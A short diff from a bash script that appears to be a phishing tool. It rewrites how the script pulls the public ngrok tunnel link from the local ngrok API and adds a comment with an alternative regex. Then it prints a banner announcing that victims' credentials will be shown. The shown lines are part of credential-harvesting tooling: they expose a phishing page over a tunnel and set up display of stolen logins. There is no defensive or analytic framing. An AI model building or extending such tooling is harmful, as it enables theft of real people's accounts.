@@ -312,11 +312,16 @@ fi
 sleep 7
 echo
 #link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
-r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq -r | grep public_url | awk '{print $2}')
+r1=$(curl -s -N http://127.0.0.1:4040/api/tunnels | jq | grep public_url | awk '{print $2}')
 r2=$(printf "${r1/\"http:\/\//}")
 r3=$(printf "${r2/\"https:\/\//}")
 r4=$(printf "${r3/\",/}")
 link=$(printf "${r4/%\",/}")
+#we can also do
+###############################################################################################
+#link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(.ngrok.io)')#
+###############################################################################################
+#but i did my way ;)
 echo; wait
 printf "${C7}<<<${R0}${C1}---------------${R0}${B1}VICTIM'S CRIDENTIALS WILL BE SHOWN HERE${R1}${C1}---------------${R0}${C7}>>>${R0}\n"; wait
 echo; wait
